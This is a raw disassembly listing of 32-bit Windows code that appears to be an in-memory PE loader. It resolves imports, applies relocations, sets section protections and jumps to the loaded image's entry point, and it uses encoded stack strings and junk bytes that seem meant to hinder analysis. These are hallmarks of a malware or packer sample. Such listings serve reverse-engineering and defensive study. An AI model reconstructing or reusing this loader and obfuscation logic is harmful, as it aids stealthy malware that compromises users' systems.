10007830:	03 00                	add    (%eax),%eax
10007832:	00 ff                	add    %bh,%bh
10007834:	b5 4c                	mov    $0x4c,%ch
10007836:	ff                   	(bad)
10007837:	ff                   	(bad)
10007838:	ff                   	(bad)
10007839:	ff 75 10             	push   0x10(%ebp)
1000783c:	57                   	push   %edi
1000783d:	e8 5c fa ff ff       	call   0x1000729e
10007842:	83 c4 0c             	add    $0xc,%esp
10007845:	66 39 5e 06          	cmp    %bx,0x6(%esi)
10007849:	89 5d f8             	mov    %ebx,-0x8(%ebp)
1000784c:	76 59                	jbe    0x100078a7
1000784e:	0f b7 45 f8          	movzwl -0x8(%ebp),%eax
10007852:	8b 8d 40 ff ff ff    	mov    -0xc0(%ebp),%ecx
10007858:	8d 04 80             	lea    (%eax,%eax,4),%eax
1000785b:	8d 3c c1             	lea    (%ecx,%eax,8),%edi
1000785e:	8b 44 c1 0c          	mov    0xc(%ecx,%eax,8),%eax
10007862:	03 45 0c             	add    0xc(%ebp),%eax
10007865:	89 85 44 ff ff ff    	mov    %eax,-0xbc(%ebp)
1000786b:	8b 47 14             	mov    0x14(%edi),%eax
1000786e:	03 45 10             	add    0x10(%ebp),%eax
10007871:	89 85 78 ff ff ff    	mov    %eax,-0x88(%ebp)
10007877:	e8 b1 fa ff ff       	call   0x1000732d
1000787c:	ba 0d 76 b6 ff       	mov    $0xffb6760d,%edx
10007881:	77 10                	ja     0x10007893
10007883:	ff b5 78 ff ff ff    	push   -0x88(%ebp)
10007889:	ff b5 44 ff ff ff    	push   -0xbc(%ebp)
1000788f:	e8 0a fa ff ff       	call   0x1000729e
10007894:	83 c4 0c             	add    $0xc,%esp
10007897:	ff 45 f8             	incl   -0x8(%ebp)
1000789a:	66 8b 45 f8          	mov    -0x8(%ebp),%ax
1000789e:	66 3b 46 06          	cmp    0x6(%esi),%ax
100078a2:	72 aa                	jb     0x1000784e
100078a4:	8b 7d 0c             	mov    0xc(%ebp),%edi
100078a7:	8b 77 3c             	mov    0x3c(%edi),%esi
100078aa:	03 f7                	add    %edi,%esi
100078ac:	89 b5 78 ff ff ff    	mov    %esi,-0x88(%ebp)
100078b2:	8b 86 80 00 00 00    	mov    0x80(%esi),%eax
100078b8:	3b c3                	cmp    %ebx,%eax
100078ba:	75 0c                	jne    0x100078c8
100078bc:	68 00 80 00 00       	push   $0x8000
100078c1:	53                   	push   %ebx
100078c2:	57                   	push   %edi
100078c3:	e9 79 02 00 00       	jmp    0x10007b41
100078c8:	8b f8                	mov    %eax,%edi
100078ca:	3b fb                	cmp    %ebx,%edi
100078cc:	0f 84 66 02 00 00    	je     0x10007b38
100078d2:	03 7d 0c             	add    0xc(%ebp),%edi
100078d5:	e8 53 fa ff ff       	call   0x1000732d
100078da:	eb ea                	jmp    0x100078c6
100078dc:	56                   	push   %esi
100078dd:	56                   	push   %esi
100078de:	39 5f 04             	cmp    %ebx,0x4(%edi)
100078e1:	75 09                	jne    0x100078ec
100078e3:	39 5f 0c             	cmp    %ebx,0xc(%edi)
100078e6:	0f 84 aa 00 00 00    	je     0x10007996
100078ec:	8b 77 0c             	mov    0xc(%edi),%esi
100078ef:	03 75 0c             	add    0xc(%ebp),%esi
100078f2:	56                   	push   %esi
100078f3:	ff 95 48 ff ff ff    	call   *-0xb8(%ebp)
100078f9:	3b c3                	cmp    %ebx,%eax
100078fb:	89 45 f8             	mov    %eax,-0x8(%ebp)
100078fe:	75 12                	jne    0x10007912
10007900:	56                   	push   %esi
10007901:	ff 95 38 ff ff ff    	call   *-0xc8(%ebp)
10007907:	3b c3                	cmp    %ebx,%eax
10007909:	89 45 f8             	mov    %eax,-0x8(%ebp)
1000790c:	0f 84 26 02 00 00    	je     0x10007b38
10007912:	e8 16 fa ff ff       	call   0x1000732d
10007917:	d2 67 d9             	shlb   %cl,-0x27(%edi)
1000791a:	c4 8b 47 10 8b 4d    	les    0x4d8b1047(%ebx),%ecx
10007920:	0c 8d                	or     $0x8d,%al
10007922:	34 08                	xor    $0x8,%al
10007924:	8b 07                	mov    (%edi),%eax
10007926:	3b c3                	cmp    %ebx,%eax
10007928:	75 05                	jne    0x1000792f
1000792a:	89 75 10             	mov    %esi,0x10(%ebp)
1000792d:	eb 05                	jmp    0x10007934
1000792f:	03 c1                	add    %ecx,%eax
10007931:	89 45 10             	mov    %eax,0x10(%ebp)
10007934:	8b 45 10             	mov    0x10(%ebp),%eax
10007937:	8b 00                	mov    (%eax),%eax
10007939:	3b c3                	cmp    %ebx,%eax
1000793b:	74 4b                	je     0x10007988
1000793d:	eb 03                	jmp    0x10007942
1000793f:	8b 4d 0c             	mov    0xc(%ebp),%ecx
10007942:	03 c8                	add    %eax,%ecx
10007944:	a9 00 00 00 80       	test   $0x80000000,%eax
10007949:	74 08                	je     0x10007953
1000794b:	25 ff ff 00 00       	and    $0xffff,%eax
10007950:	50                   	push   %eax
10007951:	eb 04                	jmp    0x10007957
10007953:	83 c1 02             	add    $0x2,%ecx
10007956:	51                   	push   %ecx
10007957:	ff 75 f8             	push   -0x8(%ebp)
1000795a:	ff 75 08             	push   0x8(%ebp)
1000795d:	e8 90 f9 ff ff       	call   0x100072f2
10007962:	83 c4 0c             	add    $0xc,%esp
10007965:	3b f3                	cmp    %ebx,%esi
10007967:	89 06                	mov    %eax,(%esi)
10007969:	0f 84 c9 01 00 00    	je     0x10007b38
1000796f:	83 45 10 04          	addl   $0x4,0x10(%ebp)
10007973:	83 c6 04             	add    $0x4,%esi
10007976:	e8 b2 f9 ff ff       	call   0x1000732d
1000797b:	07                   	pop    %es
1000797c:	99                   	cltd
1000797d:	e5 8d                	in     $0x8d,%eax
1000797f:	8b 45 10             	mov    0x10(%ebp),%eax
10007982:	8b 00                	mov    (%eax),%eax
10007984:	3b c3                	cmp    %ebx,%eax
10007986:	75 b7                	jne    0x1000793f
10007988:	8b b5 78 ff ff ff    	mov    -0x88(%ebp),%esi
1000798e:	83 c7 14             	add    $0x14,%edi
10007991:	e9 48 ff ff ff       	jmp    0x100078de
10007996:	8b 86 a0 00 00 00    	mov    0xa0(%esi),%eax
1000799c:	3b c3                	cmp    %ebx,%eax
1000799e:	74 4c                	je     0x100079ec
100079a0:	03 45 0c             	add    0xc(%ebp),%eax
100079a3:	39 18                	cmp    %ebx,(%eax)
100079a5:	74 45                	je     0x100079ec
100079a7:	8d 78 08             	lea    0x8(%eax),%edi
100079aa:	8b 48 04             	mov    0x4(%eax),%ecx
100079ad:	03 c8                	add    %eax,%ecx
100079af:	3b f9                	cmp    %ecx,%edi
100079b1:	73 34                	jae    0x100079e7
100079b3:	0f b7 0f             	movzwl (%edi),%ecx
100079b6:	8b d1                	mov    %ecx,%edx
100079b8:	81 e2 00 f0 00 00    	and    $0xf000,%edx
100079be:	81 fa 00 30 00 00    	cmp    $0x3000,%edx
100079c4:	75 15                	jne    0x100079db
100079c6:	8b 55 0c             	mov    0xc(%ebp),%edx
100079c9:	81 e1 ff 0f 00 00    	and    $0xfff,%ecx
100079cf:	03 4d 0c             	add    0xc(%ebp),%ecx
100079d2:	2b 56 34             	sub    0x34(%esi),%edx
100079d5:	03 08                	add    (%eax),%ecx
100079d7:	01 11                	add    %edx,(%ecx)
100079d9:	eb 08                	jmp    0x100079e3
100079db:	3b d3                	cmp    %ebx,%edx
100079dd:	0f 85 55 01 00 00    	jne    0x10007b38
100079e3:	47                   	inc    %edi
100079e4:	47                   	inc    %edi
100079e5:	eb c3                	jmp    0x100079aa
100079e7:	03 40 04             	add    0x4(%eax),%eax
100079ea:	eb b7                	jmp    0x100079a3
100079ec:	89 5d f8             	mov    %ebx,-0x8(%ebp)
100079ef:	eb 06                	jmp    0x100079f7
100079f1:	8b b5 78 ff ff ff    	mov    -0x88(%ebp),%esi
100079f7:	66 8b 45 f8          	mov    -0x8(%ebp),%ax
100079fb:	66 3b 46 06          	cmp    0x6(%esi),%ax
100079ff:	75 0f                	jne    0x10007a10
10007a01:	8b 95 4c ff ff ff    	mov    -0xb4(%ebp),%edx
10007a07:	33 c9                	xor    %ecx,%ecx
10007a09:	be 00 00 00 60       	mov    $0x60000000,%esi
10007a0e:	eb 28                	jmp    0x10007a38
10007a10:	e8 18 f9 ff ff       	call   0x1000732d
10007a15:	eb 0d                	jmp    0x10007a24
10007a17:	74 26                	je     0x10007a3f
10007a19:	0f b7 45 f8          	movzwl -0x8(%ebp),%eax
10007a1d:	8d 04 80             	lea    (%eax,%eax,4),%eax
10007a20:	8b 8c c6 04 01 00 00 	mov    0x104(%esi,%eax,8),%ecx
10007a27:	8b 94 c6 08 01 00 00 	mov    0x108(%esi,%eax,8),%edx
10007a2e:	8d 84 c6 f8 00 00 00 	lea    0xf8(%esi,%eax,8),%eax
10007a35:	8b 70 24             	mov    0x24(%eax),%esi
10007a38:	8d 44 0a ff          	lea    -0x1(%edx,%ecx,1),%eax
10007a3c:	33 d2                	xor    %edx,%edx
10007a3e:	f7 b5 54 ff ff ff    	divl   -0xac(%ebp)
10007a44:	33 d2                	xor    %edx,%edx
10007a46:	89 45 08             	mov    %eax,0x8(%ebp)
10007a49:	8b c1                	mov    %ecx,%eax
10007a4b:	f7 b5 54 ff ff ff    	divl   -0xac(%ebp)
10007a51:	3b 45 08             	cmp    0x8(%ebp),%eax
10007a54:	77 38                	ja     0x10007a8e
10007a56:	8b d6                	mov    %esi,%edx
10007a58:	8b fe                	mov    %esi,%edi
10007a5a:	81 e2 00 00 00 20    	and    $0x20000000,%edx
10007a60:	81 e7 00 00 00 40    	and    $0x40000000,%edi
10007a66:	81 e6 00 00 00 80    	and    $0x80000000,%esi
10007a6c:	8b 4d 18             	mov    0x18(%ebp),%ecx
10007a6f:	3b d3                	cmp    %ebx,%edx
10007a71:	74 04                	je     0x10007a77
10007a73:	80 0c 08 01          	orb    $0x1,(%eax,%ecx,1)
10007a77:	3b fb                	cmp    %ebx,%edi
10007a79:	74 04                	je     0x10007a7f
10007a7b:	80 0c 08 02          	orb    $0x2,(%eax,%ecx,1)
10007a7f:	3b f3                	cmp    %ebx,%esi
10007a81:	74 05                	je     0x10007a88
10007a83:	03 c8                	add    %eax,%ecx
10007a85:	80 09 04             	orb    $0x4,(%ecx)
10007a88:	40                   	inc    %eax
10007a89:	3b 45 08             	cmp    0x8(%ebp),%eax
10007a8c:	76 de                	jbe    0x10007a6c
10007a8e:	ff 45 f8             	incl   -0x8(%ebp)
10007a91:	8b 85 78 ff ff ff    	mov    -0x88(%ebp),%eax
10007a97:	66 8b 4d f8          	mov    -0x8(%ebp),%cx
10007a9b:	66 3b 48 06          	cmp    0x6(%eax),%cx
10007a9f:	0f 86 4c ff ff ff    	jbe    0x100079f1
10007aa5:	8b 75 0c             	mov    0xc(%ebp),%esi
10007aa8:	33 ff                	xor    %edi,%edi
10007aaa:	8b 45 18             	mov    0x18(%ebp),%eax
10007aad:	6a 02                	push   $0x2
10007aaf:	59                   	pop    %ecx
10007ab0:	0f b6 04 07          	movzbl (%edi,%eax,1),%eax
10007ab4:	2b c1                	sub    %ecx,%eax
10007ab6:	74 23                	je     0x10007adb
10007ab8:	48                   	dec    %eax
10007ab9:	74 17                	je     0x10007ad2
10007abb:	83 e8 03             	sub    $0x3,%eax
10007abe:	74 09                	je     0x10007ac9
10007ac0:	c7 45 fc 40 00 00 00 	movl   $0x40,-0x4(%ebp)
10007ac7:	eb 15                	jmp    0x10007ade
10007ac9:	c7 45 fc 04 00 00 00 	movl   $0x4,-0x4(%ebp)
10007ad0:	eb 0c                	jmp    0x10007ade
10007ad2:	c7 45 fc 20 00 00 00 	movl   $0x20,-0x4(%ebp)
10007ad9:	eb 03                	jmp    0x10007ade
10007adb:	89 4d fc             	mov    %ecx,-0x4(%ebp)
10007ade:	e8 4a f8 ff ff       	call   0x1000732d
10007ae3:	c6                   	(bad)
10007ae4:	d2 7d f2             	sarb   %cl,-0xe(%ebp)
10007ae7:	83 7d fc 40          	cmpl   $0x40,-0x4(%ebp)
10007aeb:	74 18                	je     0x10007b05
10007aed:	8d 45 fc             	lea    -0x4(%ebp),%eax
10007af0:	50                   	push   %eax
10007af1:	ff 75 fc             	push   -0x4(%ebp)
10007af4:	ff b5 54 ff ff ff    	push   -0xac(%ebp)
10007afa:	56                   	push   %esi
10007afb:	ff 95 3c ff ff ff    	call   *-0xc4(%ebp)
10007b01:	85 c0                	test   %eax,%eax
10007b03:	74 33                	je     0x10007b38
10007b05:	03 b5 54 ff ff ff    	add    -0xac(%ebp),%esi
10007b0b:	47                   	inc    %edi
10007b0c:	3b bd 74 ff ff ff    	cmp    -0x8c(%ebp),%edi
10007b12:	76 96                	jbe    0x10007aaa
10007b14:	8b 85 78 ff ff ff    	mov    -0x88(%ebp),%eax
10007b1a:	8b 70 28             	mov    0x28(%eax),%esi
10007b1d:	03 75 0c             	add    0xc(%ebp),%esi
10007b20:	e8 08 f8 ff ff       	call   0x1000732d
10007b25:	2c 7d                	sub    $0x7d,%al
10007b27:	80 8f ff 75 14 6a 01 	orb    $0x1,0x6a1475ff(%edi)
10007b2e:	ff 75 0c             	push   0xc(%ebp)
10007b31:	ff d6                	call   *%esi
10007b33:	8b 45 0c             	mov    0xc(%ebp),%eax
10007b36:	eb 0e                	jmp    0x10007b46
10007b38:	68 00 80 00 00       	push   $0x8000
10007b3d:	53                   	push   %ebx
10007b3e:	ff 75 0c             	push   0xc(%ebp)
10007b41:	ff 55 f4             	call   *-0xc(%ebp)
10007b44:	33 c0                	xor    %eax,%eax
10007b46:	5f                   	pop    %edi
10007b47:	5e                   	pop    %esi
10007b48:	5b                   	pop    %ebx
10007b49:	c9                   	leave
10007b4a:	c3                   	ret
10007b4b:	55                   	push   %ebp
10007b4c:	8b ec                	mov    %esp,%ebp
10007b4e:	81 ec ec 07 00 00    	sub    $0x7ec,%esp
10007b54:	53                   	push   %ebx
10007b55:	56                   	push   %esi
10007b56:	57                   	push   %edi
10007b57:	e8 af f7 ff ff       	call   0x1000730b
10007b5c:	c3                   	ret
10007b5d:	3a 80 a5 ac fc ff    	cmp    -0x3535b(%eax),%al
10007b63:	ff 00                	incl   (%eax)
10007b65:	80 a5 ad fc ff ff 00 	andb   $0x0,-0x353(%ebp)
10007b6c:	c6 85 ae fc ff ff 77 	movb   $0x77,-0x352(%ebp)
10007b73:	80 a5 af fc ff ff 00 	andb   $0x0,-0x351(%ebp)
10007b7a:	c6 85 b0 fc ff ff cf 	movb   $0xcf,-0x350(%ebp)
10007b81:	c6 85 b1 fc ff ff ed 	movb   $0xed,-0x34f(%ebp)
10007b88:	c6 85 b2 fc ff ff fc 	movb   $0xfc,-0x34e(%ebp)
10007b8f:	c6 85 b3 fc ff ff d8 	movb   $0xd8,-0x34d(%ebp)
10007b96:	c6 85 b4 fc ff ff fa 	movb   $0xfa,-0x34c(%ebp)
10007b9d:	c6 85 b5 fc ff ff e7 	movb   $0xe7,-0x34b(%ebp)
10007ba4:	c6 85 b6 fc ff ff eb 	movb   $0xeb,-0x34a(%ebp)
10007bab:	c6 85 b7 fc ff ff ed 	movb   $0xed,-0x349(%ebp)
10007bb2:	c6 85 b8 fc ff ff fb 	movb   $0xfb,-0x348(%ebp)
10007bb9:	c6 85 b9 fc ff ff fb 	movb   $0xfb,-0x347(%ebp)
10007bc0:	c6 85 ba fc ff ff c0 	movb   $0xc0,-0x346(%ebp)
10007bc7:	c6 85 bb fc ff ff ed 	movb   $0xed,-0x345(%ebp)
10007bce:	c6 85 bc fc ff ff e9 	movb   $0xe9,-0x344(%ebp)
10007bd5:	c6 85 bd fc ff ff f8 	movb   $0xf8,-0x343(%ebp)
10007bdc:	c6 85 be fc ff ff 88 	movb   $0x88,-0x342(%ebp)
10007be3:	8d 85 ac fc ff ff    	lea    -0x354(%ebp),%eax
10007be9:	50                   	push   %eax
10007bea:	e8 4e f7 ff ff       	call   0x1000733d
10007bef:	59                   	pop    %ecx
10007bf0:	50                   	push   %eax
10007bf1:	ff 75 18             	push   0x18(%ebp)
10007bf4:	ff 75 14             	push   0x14(%ebp)
10007bf7:	e8 f6 f6 ff ff       	call   0x100072f2
10007bfc:	83 c4 0c             	add    $0xc,%esp
10007bff:	89 85 74 f9 ff ff    	mov    %eax,-0x68c(%ebp)
10007c05:	e8 23 f7 ff ff       	call   0x1000732d
10007c0a:	61                   	popa
10007c0b:	e4 d4                	in     $0xd4,%al
10007c0d:	13 ff                	adc    %edi,%edi
10007c0f:	95                   	xchg   %eax,%ebp
10007c10:	74 f9                	je     0x10007c0b
10007c12:	ff                   	(bad)
10007c13:	ff 89 85 8c f9 ff    	decl   -0x6737b(%ecx)
10007c19:	ff c7                	inc    %edi
10007c1b:	85 7c fc ff          	test   %edi,-0x1(%esp,%edi,8)
10007c1f:	ff 04 00             	incl   (%eax,%eax,1)
10007c22:	00 00                	add    %al,(%eax)
10007c24:	80 a5 cc fc ff ff 00 	andb   $0x0,-0x334(%ebp)
10007c2b:	6a 40                	push   $0x40
10007c2d:	59                   	pop    %ecx
10007c2e:	33 c0                	xor    %eax,%eax
10007c30:	8d bd cd fc ff ff    	lea    -0x333(%ebp),%edi
10007c36:	f3 ab                	rep stos %eax,%es:(%edi)
10007c38:	66 ab                	stos   %ax,%es:(%edi)
10007c3a:	aa                   	stos   %al,%es:(%edi)
10007c3b:	c7 85 90 f9 ff ff 04 	movl   $0x4,-0x670(%ebp)
10007c42:	00 00 00 
10007c45:	80 a5 3c fc ff ff 00 	andb   $0x0,-0x3c4(%ebp)
10007c4c:	80 a5 3d fc ff ff 00 	andb   $0x0,-0x3c3(%ebp)
10007c53:	c6 85 3e fc ff ff 5c 	movb   $0x5c,-0x3c2(%ebp)
10007c5a:	80 a5 3f fc ff ff 00 	andb   $0x0,-0x3c1(%ebp)
10007c61:	c6 85 40 fc ff ff e4 	movb   $0xe4,-0x3c0(%ebp)
10007c68:	c6 85 41 fc ff ff c6 	movb   $0xc6,-0x3bf(%ebp)
10007c6f:	c6 85 42 fc ff ff d7 	movb   $0xd7,-0x3be(%ebp)
10007c76:	c6 85 43 fc ff ff ee 	movb   $0xee,-0x3bd(%ebp)
10007c7d:	c6 85 44 fc ff ff cc 	movb   $0xcc,-0x3bc(%ebp)
10007c84:	c6 85 45 fc ff ff c7 	movb   $0xc7,-0x3bb(%ebp)
10007c8b:	c6 85 46 fc ff ff d6 	movb   $0xd6,-0x3ba(%ebp)
10007c92:	c6 85 47 fc ff ff cf 	movb   $0xcf,-0x3b9(%ebp)
10007c99:	c6 85 48 fc ff ff c6 	movb   $0xc6,-0x3b8(%ebp)
10007ca0:	c6 85 49 fc ff ff e5 	movb   $0xe5,-0x3b7(%ebp)
10007ca7:	c6 85 4a fc ff ff ca 	movb   $0xca,-0x3b6(%ebp)
10007cae:	c6 85 4b fc ff ff cf 	movb   $0xcf,-0x3b5(%ebp)
10007cb5:	c6 85 4c fc ff ff c6 	movb   $0xc6,-0x3b4(%ebp)
10007cbc:	c6 85 4d fc ff ff ed 	movb   $0xed,-0x3b3(%ebp)
10007cc3:	c6 85 4e fc ff ff c2 	movb   $0xc2,-0x3b2(%ebp)
10007cca:	c6 85 4f fc ff ff ce 	movb   $0xce,-0x3b1(%ebp)
10007cd1:	c6 85 50 fc ff ff c6 	movb   $0xc6,-0x3b0(%ebp)
10007cd8:	c6 85 51 fc ff ff e2 	movb   $0xe2,-0x3af(%ebp)
10007cdf:	c6 85 52 fc ff ff a3 	movb   $0xa3,-0x3ae(%ebp)
10007ce6:	8d 85 3c fc ff ff    	lea    -0x3c4(%ebp),%eax
10007cec:	50                   	push   %eax
10007ced:	e8 4b f6 ff ff       	call   0x1000733d
10007cf2:	59                   	pop    %ecx
10007cf3:	50                   	push   %eax
10007cf4:	ff 75 18             	push   0x18(%ebp)
10007cf7:	ff 75 14             	push   0x14(%ebp)
10007cfa:	e8 f3 f5 ff ff       	call   0x100072f2
10007cff:	83 c4 0c             	add    $0xc,%esp
10007d02:	89 85 c8 fa ff ff    	mov    %eax,-0x538(%ebp)
10007d08:	80 a5 14 fc ff ff 00 	andb   $0x0,-0x3ec(%ebp)
10007d0f:	80 a5 15 fc ff ff 00 	andb   $0x0,-0x3eb(%ebp)
10007d16:	c6 85 16 fc ff ff 94 	movb   $0x94,-0x3ea(%ebp)
10007d1d:	80 a5 17 fc ff ff 00 	andb   $0x0,-0x3e9(%ebp)
10007d24:	c6 85 18 fc ff ff 2c 	movb   $0x2c,-0x3e8(%ebp)
10007d2b:	c6 85 19 fc ff ff 0e 	movb   $0xe,-0x3e7(%ebp)
10007d32:	c6 85 1a fc ff ff 1f 	movb   $0x1f,-0x3e6(%ebp)
10007d39:	c6 85 1b fc ff ff 26 	movb   $0x26,-0x3e5(%ebp)
10007d40:	c6 85 1c fc ff ff 04 	movb   $0x4,-0x3e4(%ebp)
10007d47:	c6 85 1d fc ff ff 0f 	movb   $0xf,-0x3e3(%ebp)
10007d4e:	c6 85 1e fc ff ff 1e 	movb   $0x1e,-0x3e2(%ebp)
10007d55:	c6 85 1f fc ff ff 07 	movb   $0x7,-0x3e1(%ebp)
10007d5c:	c6 85 20 fc ff ff 0e 	movb   $0xe,-0x3e0(%ebp)
10007d63:	c6 85 21 fc ff ff 23 	movb   $0x23,-0x3df(%ebp)
10007d6a:	c6 85 22 fc ff ff 0a 	movb   $0xa,-0x3de(%ebp)
10007d71:	c6 85 23 fc ff ff 05 	movb   $0x5,-0x3dd(%ebp)
10007d78:	c6 85 24 fc ff ff 0f 	movb   $0xf,-0x3dc(%ebp)
10007d7f:	c6 85 25 fc ff ff 07 	movb   $0x7,-0x3db(%ebp)
10007d86:	c6 85 26 fc ff ff 0e 	movb   $0xe,-0x3da(%ebp)
10007d8d:	c6 85 27 fc ff ff 2a 	movb   $0x2a,-0x3d9(%ebp)
10007d94:	c6 85 28 fc ff ff 6b 	movb   $0x6b,-0x3d8(%ebp)
10007d9b:	e8 8d f5 ff ff       	call   0x1000732d
10007da0:	6f                   	outsl  %ds:(%esi),(%dx)
10007da1:	23 45 a3             	and    -0x5d(%ebp),%eax
10007da4:	8d 85 14 fc ff ff    	lea    -0x3ec(%ebp),%eax
10007daa:	50                   	push   %eax
10007dab:	e8 8d f5 ff ff       	call   0x1000733d
10007db0:	59                   	pop    %ecx
10007db1:	50                   	push   %eax
10007db2:	ff 75 18             	push   0x18(%ebp)
10007db5:	ff 75 14             	push   0x14(%ebp)
10007db8:	e8 35 f5 ff ff       	call   0x100072f2
10007dbd:	83 c4 0c             	add    $0xc,%esp
10007dc0:	89 85 c0 fc ff ff    	mov    %eax,-0x340(%ebp)
10007dc6:	80 a5 cc fa ff ff 00 	andb   $0x0,-0x534(%ebp)
10007dcd:	80 a5 cd fa ff ff 00 	andb   $0x0,-0x533(%ebp)
10007dd4:	c6 85 ce fa ff ff 29 	movb   $0x29,-0x532(%ebp)
10007ddb:	80 a5 cf fa ff ff 00 	andb   $0x0,-0x531(%ebp)
10007de2:	c6 85 d0 fa ff ff 95 	movb   $0x95,-0x530(%ebp)
10007de9:	c6 85 d1 fa ff ff ba 	movb   $0xba,-0x52f(%ebp)
10007df0:	c6 85 d2 fa ff ff b9 	movb   $0xb9,-0x52e(%ebp)
10007df7:	c6 85 d3 fa ff ff a5 	movb   $0xa5,-0x52d(%ebp)
10007dfe:	c6 85 d4 fa ff ff b3 	movb   $0xb3,-0x52c(%ebp)
10007e05:	c6 85 d5 fa ff ff 9e 	movb   $0x9e,-0x52b(%ebp)
10007e0c:	c6 85 d6 fa ff ff b7 	movb   $0xb7,-0x52a(%ebp)
10007e13:	c6 85 d7 fa ff ff b8 	movb   $0xb8,-0x529(%ebp)
10007e1a:	c6 85 d8 fa ff ff b2 	movb   $0xb2,-0x528(%ebp)
10007e21:	c6 85 d9 fa ff ff ba 	movb   $0xba,-0x527(%ebp)
10007e28:	c6 85 da fa ff ff b3 	movb   $0xb3,-0x526(%ebp)
10007e2f:	c6 85 db fa ff ff d6 	movb   $0xd6,-0x525(%ebp)
10007e36:	8d 85 cc fa ff ff    	lea    -0x534(%ebp),%eax
10007e3c:	50                   	push   %eax
10007e3d:	e8 fb f4 ff ff       	call   0x1000733d
10007e42:	59                   	pop    %ecx
10007e43:	50                   	push   %eax
10007e44:	ff 75 18             	push   0x18(%ebp)
10007e47:	ff 75 14             	push   0x14(%ebp)
10007e4a:	e8 a3 f4 ff ff       	call   0x100072f2
10007e4f:	83 c4 0c             	add    $0xc,%esp
10007e52:	89 85 80 f9 ff ff    	mov    %eax,-0x680(%ebp)
10007e58:	80 a5 9c f9 ff ff 00 	andb   $0x0,-0x664(%ebp)
10007e5f:	80 a5 9d f9 ff ff 00 	andb   $0x0,-0x663(%ebp)
10007e66:	c6 85 9e f9 ff ff fc 	movb   $0xfc,-0x662(%ebp)
10007e6d:	80 a5 9f f9 ff ff 00 	andb   $0x0,-0x661(%ebp)
10007e74:	c6 85 a0 f9 ff ff 4b 	movb   $0x4b,-0x660(%ebp)
10007e7b:	c6 85 a1 f9 ff ff 66 	movb   $0x66,-0x65f(%ebp)
10007e82:	c6 85 a2 f9 ff ff 62 	movb   $0x62,-0x65e(%ebp)
10007e89:	c6 85 a3 f9 ff ff 73 	movb   $0x73,-0x65d(%ebp)
10007e90:	c6 85 a4 f9 ff ff 42 	movb   $0x42,-0x65c(%ebp)
10007e97:	c6 85 a5 f9 ff ff 6f 	movb   $0x6f,-0x65b(%ebp)
10007e9e:	c6 85 a6 f9 ff ff 6f 	movb   $0x6f,-0x65a(%ebp)
10007ea5:	c6 85 a7 f9 ff ff 6c 	movb   $0x6c,-0x659(%ebp)
10007eac:	c6 85 a8 f9 ff ff 60 	movb   $0x60,-0x658(%ebp)
10007eb3:	c6 85 a9 f9 ff ff 03 	movb   $0x3,-0x657(%ebp)
10007eba:	8d 85 9c f9 ff ff    	lea    -0x664(%ebp),%eax
10007ec0:	50                   	push   %eax
10007ec1:	e8 77 f4 ff ff       	call   0x1000733d
10007ec6:	59                   	pop    %ecx
10007ec7:	50                   	push   %eax
10007ec8:	ff 75 18             	push   0x18(%ebp)
10007ecb:	ff 75 14             	push   0x14(%ebp)
10007ece:	e8 1f f4 ff ff       	call   0x100072f2
10007ed3:	83 c4 0c             	add    $0xc,%esp
10007ed6:	89 85 84 f9 ff ff    	mov    %eax,-0x67c(%ebp)
10007edc:	e8 4c f4 ff ff       	call   0x1000732d
10007ee1:	9a 10 97 9c 80 a5 dc 	lcall  $0xdca5,$0x809c9710
10007ee8:	fa                   	cli
10007ee9:	ff                   	(bad)
10007eea:	ff 00                	incl   (%eax)
10007eec:	80 a5 dd fa ff ff 00 	andb   $0x0,-0x523(%ebp)
10007ef3:	c6 85 de fa ff ff 7d 	movb   $0x7d,-0x522(%ebp)
10007efa:	80 a5 df fa ff ff 00 	andb   $0x0,-0x521(%ebp)
10007f01:	c6 85 e0 fa ff ff ca 	movb   $0xca,-0x520(%ebp)
10007f08:	c6 85 e1 fa ff ff e7 	movb   $0xe7,-0x51f(%ebp)
10007f0f:	c6 85 e2 fa ff ff e3 	movb   $0xe3,-0x51e(%ebp)
10007f16:	c6 85 e3 fa ff ff f2 	movb   $0xf2,-0x51d(%ebp)
10007f1d:	c6 85 e4 fa ff ff c4 	movb   $0xc4,-0x51c(%ebp)
10007f24:	c6 85 e5 fa ff ff f0 	movb   $0xf0,-0x51b(%ebp)
10007f2b:	c6 85 e6 fa ff ff e7 	movb   $0xe7,-0x51a(%ebp)
10007f32:	c6 85 e7 fa ff ff e7 	movb   $0xe7,-0x519(%ebp)
10007f39:	c6 85 e8 fa ff ff 82 	movb   $0x82,-0x518(%ebp)
10007f40:	8d 85 dc fa ff ff    	lea    -0x524(%ebp),%eax
10007f46:	50                   	push   %eax
10007f47:	e8 f1 f3 ff ff       	call   0x1000733d
10007f4c:	59                   	pop    %ecx
10007f4d:	50                   	push   %eax
10007f4e:	ff 75 18             	push   0x18(%ebp)
10007f51:	ff 75 14             	push   0x14(%ebp)
10007f54:	e8 99 f3 ff ff       	call   0x100072f2
10007f59:	83 c4 0c             	add    $0xc,%esp
10007f5c:	89 85 64 fc ff ff    	mov    %eax,-0x39c(%ebp)
10007f62:	e8 c6 f3 ff ff       	call   0x1000732d
10007f67:	74 53                	je     0x10007fbc
10007f69:	0f f6 80 a5 ec fa ff 	psadbw -0x5135b(%eax),%mm0
10007f70:	ff 00                	incl   (%eax)
10007f72:	80 a5 ed fa ff ff 00 	andb   $0x0,-0x513(%ebp)
10007f79:	c6 85 ee fa ff ff 07 	movb   $0x7,-0x512(%ebp)
10007f80:	80 a5 ef fa ff ff 00 	andb   $0x0,-0x511(%ebp)
10007f87:	c6 85 f0 fa ff ff bf 	movb   $0xbf,-0x510(%ebp)
10007f8e:	c6 85 f1 fa ff ff 9d 	movb   $0x9d,-0x50f(%ebp)
10007f95:	c6 85 f2 fa ff ff 8c 	movb   $0x8c,-0x50e(%ebp)
10007f9c:	c6 85 f3 fa ff ff be 	movb   $0xbe,-0x50d(%ebp)
10007fa3:	c6 85 f4 fa ff ff 91 	movb   $0x91,-0x50c(%ebp)
10007faa:	c6 85 f5 fa ff ff 94 	movb   $0x94,-0x50b(%ebp)
10007fb1:	c6 85 f6 fa ff ff 9d 	movb   $0x9d,-0x50a(%ebp)
10007fb8:	c6 85 f7 fa ff ff ab 	movb   $0xab,-0x509(%ebp)
10007fbf:	c6 85 f8 fa ff ff 91 	movb   $0x91,-0x508(%ebp)
10007fc6:	c6 85 f9 fa ff ff 82 	movb   $0x82,-0x507(%ebp)
10007fcd:	c6 85 fa fa ff ff 9d 	movb   $0x9d,-0x506(%ebp)
10007fd4:	c6 85 fb fa ff ff f8 	movb   $0xf8,-0x505(%ebp)
10007fdb:	8d 85 ec fa ff ff    	lea    -0x514(%ebp),%eax
10007fe1:	50                   	push   %eax
